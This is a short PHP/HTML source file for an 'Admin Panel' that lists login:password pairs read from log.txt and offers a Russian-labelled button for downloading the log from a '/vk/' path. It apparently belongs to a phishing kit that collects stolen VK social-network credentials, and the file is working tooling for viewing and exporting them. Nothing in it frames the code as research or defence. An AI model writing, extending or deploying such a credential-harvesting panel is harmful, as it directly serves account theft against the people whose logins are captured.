<?php
if($_SESSION['admin']){
    $logs = file_get_contents('log.txt');
    $logs = explode(PHP_EOL, $logs);
    $i = 1;
?>
<!doctype html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport"
          content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <title>Admin Panel</title>
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.4.1/css/bootstrap.min.css"
          integrity="sha384-Vkoo8x4CGsO3+Hhxv8T/Q5PaXtkKtu6ug5TOeNV6gBiFeWPGFN9MuhOf23Q9Ifjh" crossorigin="anonymous">
</head>
<body>
<div class="container">
    <div class="row">
        <div class="col-10 offset-1 mt-5">
            <table class="table">
                <thead>
                <tr>
                    <th scope="col">#</th>
                    <th scope="col">Log:Pass</th>
                    <th scope="col"><a href="/vk/download" class="btn btn-success">Скачать txt лог</a></th>
                </tr>
                </thead>
                <tbody>
                <? foreach($logs as $log): ?>
                <tr>
                    <th scope="row"><?=$i++?></th>
                    <td><?=$log?></td>
                    <td></td>
                </tr>
                <? endforeach ?>
                </tbody>
            </table>
        </div>
    </div>
</div>

</body>
</html>
<? } else {
    header('Location: /');
    die();
}
?>
